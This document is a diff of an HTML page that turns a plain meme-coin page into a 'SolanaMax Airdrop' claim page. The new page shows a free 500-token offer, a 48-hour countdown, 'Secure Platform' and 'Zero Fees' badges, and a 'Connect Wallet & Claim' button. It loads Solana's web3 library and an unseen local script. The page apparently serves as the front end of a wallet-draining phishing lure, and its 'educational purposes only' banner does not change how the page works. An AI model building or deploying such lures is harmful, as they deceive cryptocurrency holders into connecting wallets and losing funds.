@@ -3,91 +3,242 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Fake Meme Coin</title>
-    <meta name="description" content="Fake is a fun and safe meme coin. Connect your Phantom Wallet and enjoy our features!">
-    <meta name="keywords" content="Fake, meme coin, cryptocurrency, Solana, Phantom Wallet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <title>SolanaMax Airdrop - Claim Your Tokens</title>
+    <meta name="description" content="Claim your exclusive SolanaMax airdrop! Limited time offer. Connect your wallet and get your free tokens now!">
+    <meta name="keywords" content="SolanaMax, airdrop, free tokens, cryptocurrency, Solana, claim tokens">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f5f5f5;
-            color: #333;
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            height: 100vh;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        header {
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #eee, transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
+                radial-gradient(1px 1px at 90px 40px, #fff, transparent),
+                radial-gradient(1px 1px at 130px 80px, rgba(255,255,255,0.6), transparent);
+            background-repeat: repeat;
+            background-size: 200px 100px;
+            animation: sparkle 3s linear infinite;
+        }
+
+        @keyframes sparkle {
+            from { transform: translateY(0px); }
+            to { transform: translateY(-100px); }
+        }
+
+        .container {
             text-align: center;
-            margin-bottom: 20px;
+            max-width: 600px;
+            padding: 40px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+            position: relative;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
         }
 
         h1 {
-            font-size: 2.5rem;
-            color: #ff6f61;
-            margin: 0;
+            font-size: 3rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
-        p {
-            font-size: 1.2rem;
-            color: #666;
+        .subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            font-weight: 600;
+        }
+
+        .airdrop-info {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .airdrop-amount {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #feca57;
+            margin-bottom: 10px;
+        }
+
+        .airdrop-text {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 15px;
+        }
+
+        .countdown {
+            font-size: 0.9rem;
+            color: #ff6b6b;
+            font-weight: 600;
         }
 
         .button-container {
-            margin-top: 20px;
+            margin-top: 30px;
         }
 
         .button {
-            background-color: #ff6f61;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
             color: #fff;
-            padding: 10px 20px;
-            font-size: 1rem;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: 600;
             border: none;
-            border-radius: 5px;
+            border-radius: 50px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .button:hover {
-            background-color: #e65a50;
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.4);
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 40px;
+            gap: 20px;
+        }
+
+        .feature {
+            flex: 1;
+            padding: 20px 10px;
+            text-align: center;
+        }
+
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .feature-text {
+            font-size: 0.9rem;
+            opacity: 0.8;
         }
 
         footer {
             position: absolute;
-            bottom: 10px;
+            bottom: 20px;
             text-align: center;
             font-size: 0.8rem;
-            color: #999;
+            opacity: 0.7;
         }
 
-        a {
-            color: #ff6f61;
-            text-decoration: none;
+        .warning {
+            background: rgba(255, 107, 107, 0.2);
+            border: 1px solid #ff6b6b;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 0.9rem;
         }
 
-        a:hover {
-            text-decoration: underline;
+        @media (max-width: 768px) {
+            h1 { font-size: 2.2rem; }
+            .subtitle { font-size: 1.1rem; }
+            .airdrop-amount { font-size: 2rem; }
+            .container { margin: 20px; padding: 30px 20px; }
+            .features { flex-direction: column; gap: 15px; }
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Fake Meme Coin</h1>
-        <p>Connect your Phantom Wallet and enjoy our features!</p>
-    </header>
-    <div class="button-container">
-        <button id="connect-wallet" class="button">Connect Wallet</button>
+    <div class="stars"></div>
+    
+    <div class="container">
+        <div class="logo">SM</div>
+        
+        <h1>SolanaMax Airdrop</h1>
+        <p class="subtitle">🎉 Exclusive Token Distribution Event</p>
+        
+        <div class="airdrop-info">
+            <div class="airdrop-amount">500 SMAX</div>
+            <div class="airdrop-text">Free tokens for early supporters!</div>
+            <div class="countdown">⏰ Limited Time: 48 hours remaining</div>
+        </div>
+        
+        <div class="button-container">
+            <button id="connect-wallet" class="button">🔗 Connect Wallet & Claim</button>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <div class="feature-text">Instant<br>Distribution</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <div class="feature-text">Secure<br>Platform</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎯</div>
+                <div class="feature-text">Zero<br>Fees</div>
+            </div>
+        </div>
+        
+        <div class="warning">
+            ⚠️ This is for educational purposes only. Do not use for malicious activities.
+        </div>
     </div>
+    
     <footer>
-        <p>&copy; 2024 Fake. All rights reserved.</p>
-        <p><a href="/privacy">Privacy Policy</a> | <a href="/terms">Terms of Service</a></p>
+        <p>&copy; 2024 SolanaMax. Educational demonstration only.</p>
     </footer>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.30.0/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script src="scripts/scripts.js"></script>
 </body>
 </html>
